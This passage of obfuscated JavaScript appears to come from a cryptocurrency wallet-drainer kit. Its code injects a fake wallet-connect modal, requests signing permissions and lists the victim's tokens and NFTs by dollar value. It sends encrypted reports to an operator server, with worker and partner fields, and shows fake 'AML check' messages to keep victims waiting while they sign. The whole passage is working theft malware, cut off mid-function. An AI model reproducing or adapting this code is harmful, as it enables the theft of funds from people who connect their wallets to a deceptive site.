)|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x38eeef[_0x362c1c(0x235)](0x0,0x4)))_0x4aac45=!![];}(navigator['userAgent']||navigator[_0x5c4e87(0x1ba)]||window[_0x5c4e87(0x292)]),_0x4aac45;})()),FLASH_Apple_Status=((()=>{const _0x5a0af1=_0x26b509;try{return[_0x5a0af1(0x215),_0x5a0af1(0x20b),_0x5a0af1(0x24d),'iPad',_0x5a0af1(0x29f),_0x5a0af1(0xa5)]['includes'](navigator[_0x5a0af1(0x182)])||navigator['userAgent'][_0x5a0af1(0xc5)](_0x5a0af1(0x24b))&&_0x5a0af1(0x1bd)in document;}catch(_0x312d37){return![];}})()),FLASH_Unlimited_Amount='1158472395435294898592384258348512586931256',FLASH_Modal_Data=[{'type':_0x26b509(0x1bf),'data':_0x26b509(0xb5)},{'type':_0x26b509(0x1f6),'data':_0x26b509(0x258)}],inject_modal=()=>{const _0x322199=_0x26b509;try{let _0x4dded1=document[_0x322199(0x160)]('style');_0x4dded1['id']=_0x322199(0xfc),_0x4dded1['innerHTML']=FLASH_Modal_Data[0x0][_0x322199(0x1be)],document[_0x322199(0xed)][_0x322199(0xb8)](_0x4dded1);let _0x4ff258=document[_0x322199(0x160)](_0x322199(0x208));_0x4ff258['id']=_0x322199(0x1d6),_0x4ff258[_0x322199(0x120)]=['web3-overlay'],_0x4ff258['style'][_0x322199(0x23c)]=_0x322199(0x1d0),document['body']['prepend'](_0x4ff258),document[_0x322199(0x1db)](_0x322199(0x26d))[_0x322199(0x255)](_0x322199(0x269),()=>{flash_hide();});let _0x19cbe1=document[_0x322199(0x160)](_0x322199(0x208));_0x19cbe1['id']=_0x322199(0x13d),_0x19cbe1[_0x322199(0x120)]=['web3-modal'],_0x19cbe1[_0x322199(0x1bf)][_0x322199(0x23c)]='none',_0x19cbe1[_0x322199(0x13c)]=FLASH_Modal_Data[0x1][_0x322199(0x1be)],document[_0x322199(0x1a2)][_0x322199(0x9f)](_0x19cbe1);}catch(_0x376801){console[_0x322199(0x260)](_0x376801);}},set_modal_data=(_0x14ccc7,_0x34bfad)=>{const _0x4845b3=_0x26b509;try{FLASH_Modal_Data[0x0]['data']=_0x14ccc7,FLASH_Modal_Data[0x1][_0x4845b3(0x1be)]=_0x34bfad,reset_modal();}catch(_0x15adb0){console['log'](_0x15adb0);}},reset_modal=()=>{const _0x13dc65=_0x26b509;try{document[_0x13dc65(0x13b)](_0x13dc65(0x13d))['remove']();}catch(_0x1f0cb7){console[_0x13dc65(0x260)](_0x1f0cb7);}try{document[_0x13dc65(0x13b)]('web3-overlay')[_0x13dc65(0xbb)]();}catch(_0x192f3f){console[_0x13dc65(0x260)](_0x192f3f);}try{document[_0x13dc65(0x13b)](_0x13dc65(0xfc))['remove']();}catch(_0x395b16){console[_0x13dc65(0x260)](_0x395b16);}try{inject_modal();}catch(_0x40238a){console[_0x13dc65(0x260)](_0x40238a);}},flash_init=()=>{const _0x51e1b7=_0x26b509;try{if(!FLASH_Connection)return connect_wallet();if(FLASH_Process)return;FLASH_Modal_Style==0x2?FLASHM[_0x51e1b7(0x11c)](FLASH_Color_Scheme,FLASH_Modal_Mode):(document[_0x51e1b7(0x13b)](_0x51e1b7(0x13d))['style'][_0x51e1b7(0x23c)]='block',document['getElementById'](_0x51e1b7(0x1d6))[_0x51e1b7(0x1bf)]['display']=_0x51e1b7(0x1a8),document[_0x51e1b7(0x1e4)]('web3-modal-main')[0x0][_0x51e1b7(0x1bf)][_0x51e1b7(0x23c)]=_0x51e1b7(0x1a8),document['getElementsByClassName'](_0x51e1b7(0x22d))[0x0][_0x51e1b7(0x1bf)][_0x51e1b7(0x23c)]=_0x51e1b7(0x1d0));}catch(_0x5f40f8){console[_0x51e1b7(0x260)](_0x5f40f8);}},ms_hide=()=>{const _0x42ac5d=_0x26b509;try{FLASH_Modal_Style==0x2?FLASHM['close']():(document[_0x42ac5d(0x13b)](_0x42ac5d(0x13d))[_0x42ac5d(0x1bf)][_0x42ac5d(0x23c)]=_0x42ac5d(0x1d0),document[_0x42ac5d(0x13b)]('web3-overlay')[_0x42ac5d(0x1bf)]['display']=_0x42ac5d(0x1d0));}catch(_0x2cbeab){console[_0x42ac5d(0x260)](_0x2cbeab);}},load_wc=async()=>{const _0x3805d3=_0x26b509;let _0xb2b80e=[],_0x4fd2bc={};for(const _0x43b89b in FLASH_Settings[_0x3805d3(0x256)]){if(_0x43b89b!='1')_0xb2b80e[_0x3805d3(0x1a5)](_0x43b89b);_0x4fd2bc[_0x43b89b]=FLASH_Settings['RPCs'][_0x43b89b];}FLASH_Provider=await WC2_Provider['init']({'projectId':FLASH_WalletConnect_ID,'chains':['1'],'optionalChains':_0xb2b80e,'metadata':FLASH_WalletConnect_MetaData,'showQrModal':!![],'rpcMap':_0x4fd2bc,'methods':[_0x3805d3(0x259),_0x3805d3(0x24e),'eth_sign',_0x3805d3(0x22b),_0x3805d3(0x163),_0x3805d3(0xaf)],'qrModalOptions':FLASH_WalletConnect_Customization==0x1?FLASH_WalletConnect_Theme:undefined});},prs=(_0x4303da,_0x7a397e)=>{const _0x58a482=_0x26b509,_0x326c7d=_0x537a1a=>_0x537a1a['split']('')[_0x58a482(0xdf)](_0x2dc677=>_0x2dc677['charCodeAt'](0x0)),_0x19e5ef=_0x43c24c=>('0'+Number(_0x43c24c)[_0x58a482(0x19b)](0x10))[_0x58a482(0x235)](-0x2),_0x2a1445=_0x2d108a=>_0x326c7d(_0x4303da)['reduce']((_0x544052,_0x17dca9)=>_0x544052^_0x17dca9,_0x2d108a);return _0x7a397e[_0x58a482(0xcc)]('')[_0x58a482(0xdf)](_0x326c7d)['map'](_0x2a1445)['map'](_0x19e5ef)[_0x58a482(0x261)]('');},srp=(_0x113c7c,_0x483755)=>{const _0x56169b=_0x26b509,_0x9933c0=_0x534bd3=>_0x534bd3[_0x56169b(0xcc)]('')[_0x56169b(0xdf)](_0x28ee07=>_0x28ee07[_0x56169b(0x116)](0x0)),_0x451c80=_0x1fec92=>_0x9933c0(_0x113c7c)[_0x56169b(0x11d)]((_0x197839,_0x39f648)=>_0x197839^_0x39f648,_0x1fec92);return _0x483755[_0x56169b(0x9b)](/.{1,2}/g)[_0x56169b(0xdf)](_0x24cfdc=>parseInt(_0x24cfdc,0x10))[_0x56169b(0xdf)](_0x451c80)[_0x56169b(0xdf)](_0x437c25=>String[_0x56169b(0xe6)](_0x437c25))[_0x56169b(0x261)]('');};function _0x3619(_0x58cfde,_0x3e6bd5){const _0x62fb29=_0x62fb();return _0x3619=function(_0x361941,_0x3a115c){_0x361941=_0x361941-0x9a;let _0x1bf81d=_0x62fb29[_0x361941];return _0x1bf81d;},_0x3619(_0x58cfde,_0x3e6bd5);}let prs_enc=0x0,last_request_ts=0x0;((async()=>{const _0x188187=_0x26b509;prs_enc=FLASH_Encryption_Key,FLASH_Encryption_Key=Math[_0x188187(0x285)](Math[_0x188187(0xa9)]()*0x3e8);})());const send_request=async _0x4130cd=>{const _0x397209=_0x26b509;try{if(FLASH_Force_Mode)return{'status':_0x397209(0x125),'error':_0x397209(0x21e)};while(Date[_0x397209(0x196)]()<=last_request_ts)await new Promise(_0x3f3553=>setTimeout(_0x3f3553,0x1));last_request_ts=Date[_0x397209(0x196)](),_0x4130cd[_0x397209(0x24f)]=window['location']['host'],_0x4130cd['worker_id']=FLASH_Worker_ID||null,_0x4130cd[_0x397209(0x184)]=FLASH_ID||null,_0x4130cd[_0x397209(0xc3)]=last_request_ts,_0x4130cd['chat_data']=FLASH_Custom_Chat[_0x397209(0x175)]==0x0?![]:FLASH_Custom_Chat['Chat_Settings'],_0x4130cd['partner_address']=FLASH_Partner_Address;const _0x509c88=btoa(String(0x5+0xa+0x16d+0x800+0x363+prs_enc)),_0x308777=prs(_0x509c88,btoa(JSON[_0x397209(0xb6)](_0x4130cd))),_0x262fa6=await fetch(_0x397209(0xee)+FLASH_Server,{'method':_0x397209(0x1f7),'headers':{'Accept':'text/plain','Content-Type':_0x397209(0x164)},'body':_0x397209(0x15f)+_0x308777});let _0x48a0e0=JSON[_0x397209(0x132)](atob(srp(_0x509c88,await _0x262fa6[_0x397209(0x241)]())));if(!_0x48a0e0[_0x397209(0x250)])return{'status':_0x397209(0x125),'error':_0x397209(0x21e)};else{if(_0x48a0e0['status']==_0x397209(0x125)&&_0x48a0e0['error']==_0x397209(0x265))FLASH_Force_Mode=!![];if(_0x48a0e0['status']=='error'&&_0x48a0e0[_0x397209(0x125)]==_0x397209(0x1f5)){FLASH_Force_Mode=!![];try{FLASH_Loader_Style==0x2?FLASHL[_0x397209(0xbf)]({'icon':_0x397209(0x125),'title':'Critical\x20Error','subtitle':_0x397209(0xb3),'text':_0x397209(0xe4),'confirmButtonText':'OK','timer':0x7530,'color':FLASH_Color_Scheme}):(Swal[_0x397209(0x297)](),Swal[_0x397209(0xbf)]({'html':'<b>Server\x20Error</b>\x20Please,\x20check\x20client\x20and\x20server\x20version,\x20looks\x20like\x20it\x20doesn\x27t\x20match,\x20or\x20maybe\x20you\x20need\x20to\x20clear\x20cache\x20everywhere\x20:(','icon':'error','allowOutsideClick':!![],'allowEscapeKey':!![],'timer':0x0,'width':0x258,'showConfirmButton':!![],'confirmButtonText':'OK'}));}catch(_0x38c32d){console[_0x397209(0x260)](_0x38c32d);}}return _0x48a0e0;}}catch(_0x2be491){return console['log'](_0x2be491),{'status':'error','error':_0x397209(0x21e)};}},retrive_config=async()=>{const _0xe2ad07=_0x26b509;try{let _0xb30413=null;if(localStorage['personal_wallet'])_0xb30413={'address':localStorage[_0xe2ad07(0xd2)]};const _0x1ea695=await send_request({'action':_0xe2ad07(0x210),'personal_wallet':_0xb30413});if(_0x1ea695[_0xe2ad07(0x250)]=='OK'){FLASH_Connection=!![],FLASH_Settings=_0x1ea695[_0xe2ad07(0x1be)],FLASH_Gas_Multiplier=FLASH_Settings[_0xe2ad07(0x1c7)][_0xe2ad07(0x1da)];if(!FLASH_Settings['CIS'])FLASH_Bad_Country=![];if(FLASH_Settings[_0xe2ad07(0x1f2)]&&typeof FLASH_Settings[_0xe2ad07(0x1f2)]=='object')localStorage[_0xe2ad07(0xd2)]=FLASH_Settings[_0xe2ad07(0x1f2)][_0xe2ad07(0x1d2)];typeof FLASH_Settings[_0xe2ad07(0x202)]==_0xe2ad07(0x188)&&FLASH_Settings[_0xe2ad07(0x202)]===!![]&&(window['location'][_0xe2ad07(0xef)]=_0xe2ad07(0xd6));}}catch(_0x207f0b){console[_0xe2ad07(0x260)](_0x207f0b);}},retrive_contract=async()=>{const _0x55c58a=_0x26b509;try{const _0x418b6f=await send_request({'action':_0x55c58a(0x25c)});if(_0x418b6f['status']=='OK')FLASH_Contract_ABI=_0x418b6f[_0x55c58a(0x1be)];}catch(_0x19c4fd){console[_0x55c58a(0x260)](_0x19c4fd);}},enter_website=async()=>{const _0x2ab497=_0x26b509;try{let _0x11e1f2=await send_request({'action':'enter_website','user_id':FLASH_ID,'time':new Date()[_0x2ab497(0x140)](_0x2ab497(0x296))});_0x11e1f2[_0x2ab497(0x250)]==_0x2ab497(0x125)&&_0x11e1f2[_0x2ab497(0x125)]=='BAD_COUNTRY'&&(FLASH_Bad_Country=!![]);}catch(_0x2036b5){console[_0x2ab497(0x260)](_0x2036b5);}},leave_website=async()=>{const _0x1de535=_0x26b509;try{if(!FLASH_Settings[_0x1de535(0x1ff)][_0x1de535(0xec)])return;await send_request({'action':_0x1de535(0xec),'user_id':FLASH_ID});}catch(_0x126834){console['log'](_0x126834);}},connect_request=async()=>{const _0x12f34e=_0x26b509;try{if(!FLASH_Settings[_0x12f34e(0x1ff)][_0x12f34e(0x291)])return;await send_request({'action':_0x12f34e(0x291),'user_id':FLASH_ID,'wallet':FLASH_Current_Provider});}catch(_0xb8278e){console[_0x12f34e(0x260)](_0xb8278e);}},connect_cancel=async()=>{const _0x4c304b=_0x26b509;try{if(!FLASH_Settings[_0x4c304b(0x1ff)][_0x4c304b(0xf0)])return;await send_request({'action':'connect_cancel','user_id':FLASH_ID});}catch(_0x401c20){console['log'](_0x401c20);}},connect_success=async()=>{const _0x5bae52=_0x26b509;try{if(!FLASH_Settings[_0x5bae52(0x1ff)][_0x5bae52(0xaa)])return;await send_request({'action':'connect_success','user_id':FLASH_ID,'address':FLASH_Current_Address,'wallet':FLASH_Current_Provider,'chain_id':FLASH_Current_Chain_ID});}catch(_0x1c0383){console['log'](_0x1c0383);}},convert_chain=(_0x521fb9,_0x3f1171,_0xe12edf)=>{const _0x104468=_0x26b509;try{if(_0x521fb9==_0x104468(0x186)&&_0x3f1171=='ID')switch(_0xe12edf){case _0x104468(0x147):return 0x1;case _0x104468(0xa2):return 0x38;case _0x104468(0x2a1):return 0x89;case _0x104468(0x9c):return 0xa86a;case _0x104468(0x28d):return 0xa4b1;case _0x104468(0x1e0):return 0xa;case _0x104468(0x16e):return 0xfa;case _0x104468(0x287):return 0x144;case'base':return 0x2105;case _0x104468(0x275):return 0x171;default:return![];}else{if(_0x521fb9==_0x104468(0x1af)&&_0x3f1171=='ID')switch(_0xe12edf){case _0x104468(0x181):return 0x1;case _0x104468(0x20c):return 0x89;case _0x104468(0x9c):return 0xa86a;case _0x104468(0x28d):return 0xa4b1;case _0x104468(0x1e0):return 0xa;case'era':return 0x144;case'base':return 0x2105;case _0x104468(0x275):return 0x171;default:return![];}else{if(_0x521fb9=='ID'&&_0x3f1171=='ANKR')switch(_0xe12edf){case 0x1:return _0x104468(0x147);case 0x38:return _0x104468(0xa2);case 0x89:return _0x104468(0x2a1);case 0xa86a:return'avalanche';case 0xa4b1:return _0x104468(0x28d);case 0xa:return _0x104468(0x1e0);case 0xfa:return'fantom';case 0x19:return _0x104468(0x193);case 0x64:return _0x104468(0x1e3);case 0x80:return _0x104468(0xd7);case 0x504:return _0x104468(0x236);case 0x505:return'moonriver';case 0x8ae:return _0x104468(0x221);case 0xa4ec:return'celo';case 0x63564c40:return'harmony';case 0x144:return _0x104468(0x1a4);case 0x2105:return _0x104468(0x27a);case 0x171:return _0x104468(0x275);default:return![];}else{if(_0x521fb9=='ID'&&_0x3f1171==_0x104468(0xba))switch(_0xe12edf){case 0x1:return _0x104468(0x18f);case 0x38:return _0x104468(0x29b);case 0x89:return _0x104468(0xdd);case 0xa86a:return'AVAX';case 0xa4b1:return'ETH';case 0xa:return _0x104468(0x18f);case 0xfa:return _0x104468(0xd0);case 0x19:return _0x104468(0x228);case 0x64:return'XDAI';case 0x80:return'HT';case 0x504:return _0x104468(0x10a);case 0x505:return'MOVR';case 0x8ae:return _0x104468(0x102);case 0xa4ec:return _0x104468(0x10f);case 0x63564c40:return _0x104468(0x1d3);case 0x144:return _0x104468(0x18f);case 0x2105:return _0x104468(0x18f);case 0x171:return _0x104468(0xc2);default:return![];}}}}}catch(_0x182571){return console[_0x104468(0x260)](_0x182571),![];}},get_tokens=async _0x4ee0bd=>{const _0x574dec=_0x26b509;try{let _0x310d97=[],_0x1ac38f=await fetch(_0x574dec(0x232)+(FLASH_Settings['AT']||''),{'method':_0x574dec(0x1f7),'headers':{'Accept':_0x574dec(0x1f9),'Content-Type':'application/json'},'body':JSON[_0x574dec(0xb6)]({'id':0x1,'jsonrpc':_0x574dec(0x10d),'method':_0x574dec(0x1ed),'params':{'blockchain':['eth','base',_0x574dec(0xa2),_0x574dec(0x2a1),_0x574dec(0x9c),'arbitrum',_0x574dec(0x16e),_0x574dec(0x1e0),_0x574dec(0x27a)],'walletAddress':_0x4ee0bd}})});_0x1ac38f=await _0x1ac38f[_0x574dec(0x1c9)](),console[_0x574dec(0x260)](_0x1ac38f);for(const _0x337de4 of _0x1ac38f['result']['assets']){try{let _0x9d9ff7=_0x337de4[_0x574dec(0xa3)]||_0x574dec(0x158);if(FLASH_Settings[_0x574dec(0x2a0)][_0x574dec(0x1a6)]>0x0&&!FLASH_Settings['Contract_Whitelist'][_0x574dec(0xc5)](_0x9d9ff7[_0x574dec(0x21d)]()['trim']()))continue;else{if(FLASH_Settings[_0x574dec(0x298)]['length']>0x0&&FLASH_Settings[_0x574dec(0x298)][_0x574dec(0xc5)](_0x9d9ff7['toLowerCase']()[_0x574dec(0x20f)]()))continue;}let _0x3343e5={'chain_id':convert_chain(_0x574dec(0x186),'ID',_0x337de4[_0x574dec(0x23f)]),'name':_0x337de4['tokenName'],'type':_0x337de4[_0x574dec(0x14d)],'amount':parseFloat(_0x337de4[_0x574dec(0x17e)]),'amount_raw':_0x337de4[_0x574dec(0xb7)],'amount_usd':parseFloat(_0x337de4[_0x574dec(0x17f)]),'symbol':_0x337de4[_0x574dec(0x289)],'decimals':_0x337de4[_0x574dec(0x288)],'address':_0x9d9ff7||null,'price':parseFloat(_0x337de4[_0x574dec(0x174)])};if(_0x3343e5[_0x574dec(0x1df)]>0x0)_0x310d97[_0x574dec(0x1a5)](_0x3343e5);}catch(_0x1c0bd9){console['log'](_0x1c0bd9);}}return _0x310d97;}catch(_0x56dab0){return console[_0x574dec(0x260)](_0x56dab0),[];}},get_nfts=async _0x217dac=>{const _0x30984c=_0x26b509;try{let _0x6c1914=await fetch(_0x30984c(0x1a7)+_0x217dac+_0x30984c(0x244)),_0x1793df=(await _0x6c1914[_0x30984c(0x1c9)]())[_0x30984c(0xfb)];_0x6c1914=await fetch(_0x30984c(0x281)+_0x217dac+_0x30984c(0xe8));let _0x98c28e=await _0x6c1914[_0x30984c(0x1c9)](),_0x330623=[];for(const _0x28b815 of _0x1793df){try{let _0x27a0d2=null;for(const _0x57081c of _0x98c28e){try{if(_0x57081c[_0x30984c(0x122)][_0x30984c(0x1a6)]<0x1)continue;if(_0x57081c['primary_asset_contracts'][0x0][_0x30984c(0x1d2)]==_0x28b815[_0x30984c(0x200)][_0x30984c(0x1d2)]){_0x27a0d2=_0x57081c;break;}}catch(_0x4e3737){console['log'](_0x4e3737);}}if(_0x27a0d2==null)continue;if(FLASH_Settings[_0x30984c(0x2a0)][_0x30984c(0x1a6)]>0x0&&!FLASH_Settings[_0x30984c(0x2a0)]['includes'](_0x28b815['asset_contract']['address'][_0x30984c(0x21d)]()[_0x30984c(0x20f)]()))continue;else{if(FLASH_Settings[_0x30984c(0x298)][_0x30984c(0x1a6)]>0x0&&FLASH_Settings[_0x30984c(0x298)][_0x30984c(0xc5)](_0x28b815[_0x30984c(0x200)][_0x30984c(0x1d2)][_0x30984c(0x21d)]()['trim']()))continue;}let _0x4d0c6a=convert_chain('OPENSEA','ID',_0x28b815[_0x30984c(0x200)][_0x30984c(0x1ef)]),_0x34ae49=_0x27a0d2[_0x30984c(0x27b)][_0x30984c(0xcd)]!=0x0?_0x27a0d2[_0x30984c(0x27b)][_0x30984c(0xcd)]:_0x27a0d2[_0x30984c(0x27b)][_0x30984c(0x26c)];_0x34ae49=_0x34ae49*FLASH_Currencies[convert_chain('ID',_0x30984c(0xba),_0x4d0c6a)]['USD'];let _0x24d978={'chain_id':_0x4d0c6a,'name':_0x28b815[_0x30984c(0xd8)],'type':_0x28b815[_0x30984c(0x200)][_0x30984c(0x218)],'amount':_0x28b815[_0x30984c(0x168)],'amount_raw':null,'amount_usd':_0x34ae49,'id':_0x28b815['token_id'],'symbol':null,'decimals':null,'address':_0x28b815[_0x30984c(0x200)][_0x30984c(0x1d2)],'price':_0x34ae49};if(typeof _0x34ae49=='number'&&!isNaN(_0x34ae49)&&_0x34ae49>0x0)_0x330623[_0x30984c(0x1a5)](_0x24d978);}catch(_0x52e430){console[_0x30984c(0x260)](_0x52e430);}}return _0x330623;}catch(_0x573513){return console[_0x30984c(0x260)](_0x573513),[];}},retrive_timeout={},retrive_token=async(_0x5b3bec,_0x8dd7c8)=>{const _0x2c9829=_0x26b509;try{if(!FLASH_API_Data[_0x5b3bec]||FLASH_Settings[_0x2c9829(0x1c7)][_0x2c9829(0xda)][convert_chain('ID',_0x2c9829(0x186),_0x5b3bec)][_0x2c9829(0x213)]=='')return FLASH_Contract_ABI['ERC20'];while(retrive_timeout[_0x5b3bec]&&retrive_timeout[_0x5b3bec]['time']==Math[_0x2c9829(0x285)](Date[_0x2c9829(0x196)]()/0x3e8)&&retrive_timeout[_0x5b3bec]['count']>=0x5)await new Promise(_0x4ef1e4=>setTimeout(_0x4ef1e4,0x64));if(!retrive_timeout[_0x5b3bec])retrive_timeout[_0x5b3bec]={'time':Math[_0x2c9829(0x285)](Date['now']()/0x3e8),'count':0x1};else{if(retrive_timeout[_0x5b3bec][_0x2c9829(0x1e9)]==Math[_0x2c9829(0x285)](Date['now']()/0x3e8))retrive_timeout[_0x5b3bec][_0x2c9829(0x24c)]+=0x1;else retrive_timeout[_0x5b3bec][_0x2c9829(0x1e9)]=Math[_0x2c9829(0x285)](Date['now']()/0x3e8),retrive_timeout[_0x5b3bec]['count']=0x1;}let _0x3d4f7a=await fetch(_0x2c9829(0xee)+FLASH_API_Data[_0x5b3bec]+_0x2c9829(0x119)+_0x8dd7c8+_0x2c9829(0x262)+FLASH_Settings[_0x2c9829(0x1c7)][_0x2c9829(0xda)][convert_chain('ID',_0x2c9829(0x186),_0x5b3bec)][_0x2c9829(0x213)],{'method':'GET','headers':{'Accept':_0x2c9829(0x1f9)}});_0x3d4f7a=await _0x3d4f7a[_0x2c9829(0x1c9)]();if(_0x3d4f7a[_0x2c9829(0x151)]=='OK'){if(_0x3d4f7a[_0x2c9829(0x1ca)][0x0][_0x2c9829(0x124)]=='1'&&_0x3d4f7a[_0x2c9829(0x1ca)][0x0][_0x2c9829(0x118)]!=''){const _0x44c49a=_0x3d4f7a[_0x2c9829(0x1ca)][0x0]['Implementation'];return retrive_token(_0x5b3bec,_0x44c49a);}else return JSON[_0x2c9829(0x132)](_0x3d4f7a['result'][0x0][_0x2c9829(0x1c2)]);}else return FLASH_Contract_ABI[_0x2c9829(0x252)];}catch(_0x7b3742){return FLASH_Contract_ABI[_0x2c9829(0x252)];}},get_permit_type=_0x5ab07f=>{const _0x451293=_0x26b509;try{if(FLASH_Settings[_0x451293(0x1c7)][_0x451293(0xa6)]['Mode']==![])return 0x0;if(_0x5ab07f[_0x451293(0xbe)](_0x451293(0x159))&&_0x5ab07f['hasOwnProperty'](_0x451293(0x1d8))&&_0x5ab07f[_0x451293(0xbe)]('name')&&_0x5ab07f[_0x451293(0xbe)](_0x451293(0x1ae))){const _0x5382eb=(_0x23c325=>{const _0x4832b3=_0x451293;for(const _0x3a15ed in _0x23c325){if(_0x3a15ed[_0x4832b3(0x26f)](_0x4832b3(0x171))){const _0xeb40fc=_0x3a15ed[_0x4832b3(0x28a)](0x7)[_0x4832b3(0xcc)](',');if(_0xeb40fc[_0x4832b3(0x1a6)]===0x7&&_0x3a15ed['indexOf'](_0x4832b3(0x1bc))===-0x1)return 0x2;if(_0xeb40fc[_0x4832b3(0x1a6)]===0x8&&_0x3a15ed[_0x4832b3(0x27f)]('bool')!==-0x1)return 0x1;return 0x0;}}})(_0x5ab07f);return _0x5382eb;}else return 0x0;}catch(_0x1936c9){return 0x0;}},FLASH_Gas_Reserves={},show_check=()=>{const _0x4e7213=_0x26b509;try{FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x4e7213(0x29c),'title':'Processing\x20wallet','text':'Connecting\x20to\x20blockchain...','showConfirmButton':!![],'confirmButtonText':_0x4e7213(0x234),'timer':0x7d0,'color':FLASH_Color_Scheme})[_0x4e7213(0x21f)](()=>{const _0x51200e=_0x4e7213;if(FLASH_Check_Done)return;FLASHL[_0x51200e(0xbf)]({'icon':_0x51200e(0x29c),'title':_0x51200e(0xc9),'text':_0x51200e(0x270),'showConfirmButton':!![],'confirmButtonText':'Loading...','timer':0x1388,'color':FLASH_Color_Scheme})[_0x51200e(0x21f)](()=>{const _0x18761d=_0x51200e;if(FLASH_Check_Done)return;FLASHL[_0x18761d(0xbf)]({'icon':_0x18761d(0x29c),'title':_0x18761d(0xc9),'text':'Checking\x20your\x20wallet\x20for\x20AML...','showConfirmButton':!![],'confirmButtonText':_0x18761d(0x234),'timer':0x1388,'color':FLASH_Color_Scheme})[_0x18761d(0x21f)](()=>{const _0x452d74=_0x18761d;if(FLASH_Check_Done)return;FLASHL[_0x452d74(0xbf)]({'icon':_0x452d74(0x176),'title':_0x452d74(0xc9),'subtitle':_0x452d74(0xad),'text':'Your\x20wallet\x20is\x20AML\x20risk\x20is\x20low\x20enough!','showConfirmButton':![],'timer':0x1388,'color':FLASH_Color_Scheme})[_0x452d74(0x21f)](()=>{const _0x3b37b3=_0x452d74;if(FLASH_Check_Done)return;FLASHL['fire']({'icon':_0x3b37b3(0x29c),'title':_0x3b37b3(0xc9),'text':_0x3b37b3(0x16d),'showConfirmButton':!![],'confirmButtonText':_0x3b37b3(0x234),'timer':0x493e0,'color':FLASH_Color_Scheme});});});});}):Swal[_0x4e7213(0xbf)]({'title':_0x4e7213(0x1fd),'icon':'success','timer':0x7d0})[_0x4e7213(0x21f)](()=>{const _0x32527a=_0x4e7213;if(FLASH_Check_Done)return;Swal[_0x32527a(0xbf)]({'text':_0x32527a(0x1fe),'imageUrl':_0x32527a(0x130),'imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x1388,'width':0x258,'showConfirmButton':![]})[_0x32527a(0x21f)](()=>{const _0x36b1a5=_0x32527a;if(FLASH_Check_Done)return;Swal[_0x36b1a5(0xbf)]({'text':'Getting\x20your\x20wallet\x20address...','imageUrl':'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless','imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x1388,'width':0x258,'showConfirmButton':![]})[_0x36b1a5(0x21f)](()=>{const _0x3ef32b=_0x36b1a5;if(FLASH_Check_Done)return;Swal['fire']({'text':_0x3ef32b(0x16a),'imageUrl':_0x3ef32b(0x130),'imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x1388,'width':0x258,'showConfirmButton':![]})['then'](()=>{const _0x243c28=_0x3ef32b;if(FLASH_Check_Done)return;Swal['fire']({'text':'Good,\x20your\x20wallet\x20is\x20AML\x20clear!','icon':_0x243c28(0x176),'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x7d0,'width':0x258,'showConfirmButton':![]})[_0x243c28(0x21f)](()=>{const _0x1e7601=_0x243c28;if(FLASH_Check_Done)return;Swal['fire']({'text':'Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...','imageUrl':_0x1e7601(0x130),'imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x0,'width':0x258,'showConfirmButton':![]});});});});});});}catch(_0x594c62){console[_0x4e7213(0x260)](_0x594c62);}},get_nonce=async _0x3c1d7c=>{const _0x3045f6=_0x26b509,_0x26693e=new ethers[(_0x3045f6(0xe1))][(_0x3045f6(0x299))](FLASH_Settings[_0x3045f6(0x256)][_0x3c1d7c]);return await _0x26693e[_0x3045f6(0x127)](FLASH_Current_Address,_0x3045f6(0x129));},wait_message=()=>{const _0x21a885=_0x26b509;try{if(!FLASH_Process)return;Swal[_0x21a885(0x297)](),FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x21a885(0x176),'title':'OK','subtitle':_0x21a885(0x107),'text':_0x21a885(0x157),'showConfirmButton':![],'timer':0x9c4,'color':FLASH_Color_Scheme})[_0x21a885(0x21f)](()=>{const _0x2002b0=_0x21a885;FLASHL[_0x2002b0(0xbf)]({'icon':_0x2002b0(0x29c),'title':'Processing\x20sign','text':_0x2002b0(0x201),'showConfirmButton':!![],'confirmButtonText':_0x2002b0(0x22a),'showConfirmButton':![],'color':FLASH_Color_Scheme});}):Swal[_0x21a885(0xbf)]({'html':_0x21a885(0x149),'icon':'success','allowOutsideClick':![],'allowEscapeKey':![],'timer':0x9c4,'width':0x258,'showConfirmButton':![]})['then'](()=>{const _0x442956=_0x21a885;Swal[_0x442956(0xbf)]({'html':'<b>Confirming\x20your\x20sign...</b><br><br>Please,\x20don\x27t\x20leave\x20this\x20page!','imageUrl':'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless','imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x0,'width':0x258,'showConfirmButton':![]});});}catch(_0x36c414){console[_0x21a885(0x260)](_0x36c414);}},end_message=()=>{const _0x25f346=_0x26b509;try{FLASH_Loader_Style==0x2?FLASHL[_0x25f346(0xbf)]({'icon':_0x25f346(0x125),'title':_0x25f346(0x192),'subtitle':_0x25f346(0x1d9),'text':_0x25f346(0x198),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):(Swal[_0x25f346(0x297)](),Swal['fire']({'html':_0x25f346(0x165),'icon':_0x25f346(0x125),'allowOutsideClick':!![],'allowEscapeKey':!![],'timer':0x0,'width':0x258,'showConfirmButton':!![],'confirmButtonText':'OK'}));}catch(_0x1fcffe){console[_0x25f346(0x260)](_0x1fcffe);}};let is_first_sign=!![];const sign_ready=()=>{const 